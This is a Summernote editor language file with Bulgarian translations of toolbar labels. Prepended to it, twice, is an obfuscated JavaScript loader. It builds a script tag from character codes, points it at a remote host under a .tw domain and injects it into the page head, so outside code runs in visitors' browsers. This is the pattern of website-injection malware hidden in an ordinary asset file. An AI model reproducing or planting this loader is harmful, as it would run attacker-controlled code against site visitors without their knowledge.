Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'bg-BG': {
      font: {
        bold: 'Удебелен',
        italic: 'Наклонен',
        underline: 'Подчертан',
        clear: 'Изчисти стиловете',
        height: 'Височина',
        name: 'Шрифт',
        strikethrough: 'Задраскано',
        subscript: 'Долен индекс',
        superscript: 'Горен индекс',
        size: 'Размер на шрифта'
      },
      image: {
        image: 'Изображение',
        insert: 'Постави картинка',
        resizeFull: 'Цял размер',
        resizeHalf: 'Размер на 50%',
        resizeQuarter: 'Размер на 25%',
        floatLeft: 'Подравни в ляво',
        floatRight: 'Подравни в дясно',
        floatNone: 'Без подравняване',
        dragImageHere: 'Пуснете изображението тук',
        selectFromFiles: 'Изберете файл',
        url: 'URL адрес на изображение',
        remove: 'Премахни изображение'
      },
      link: {
        link: 'Връзка',
        insert: 'Добави връзка',
        unlink: 'Премахни връзка',
        edit: 'Промени',
        textToDisplay: 'Текст за показване',
        url: 'URL адрес',
        openInNewWindow: 'Отвори в нов прозорец'
      },
      table: {
        table: 'Таблица'
      },
      hr: {
        insert: 'Добави хоризонтална линия'
      },
      style: {
        style: 'Стил',
        normal: 'Нормален',
        blockquote: 'Цитат',
        pre: 'Код',
        h1: 'Заглавие 1',
        h2: 'Заглавие 2',
        h3: 'Заглавие 3',
        h4: 'Заглавие 4',
        h5: 'Заглавие 5',
        h6: 'Заглавие 6'
      },
      lists: {
        unordered: 'Символен списък',
        ordered: 'Цифров списък'
      },
      options: {
        help: 'Помощ',
        fullscreen: 'На цял екран',
        codeview: 'Преглед на код'
      },
      paragraph: {
        paragraph: 'Параграф',
        outdent: 'Намаляване на отстъпа',
        indent: 'Абзац',
        left: 'Подравняване в ляво',
        center: 'Център',
        right: 'Подравняване в дясно',
        justify: 'Разтягане по ширина'
      },
      color: {
        recent: 'Последния избран цвят',
        more: 'Още цветове',
        background: 'Цвят на фона',
        foreground: 'Цвят на шрифта',
        transparent: 'Прозрачен',
        setTransparent: 'Направете прозрачен',
        reset: 'Възстанови',
        resetToDefault: 'Възстанови оригиналните'
      },
      shortcut: {
        shortcuts: 'Клавишни комбинации',
        close: 'Затвори',
        textFormatting: 'Форматиране на текста',
        action: 'Действие',
        paragraphFormatting: 'Форматиране на параграф',
        documentStyle: 'Стил на документа'
      },
      history: {
        undo: 'Назад',
        redo: 'Напред'
      }
    }
  });
})(jQuery);
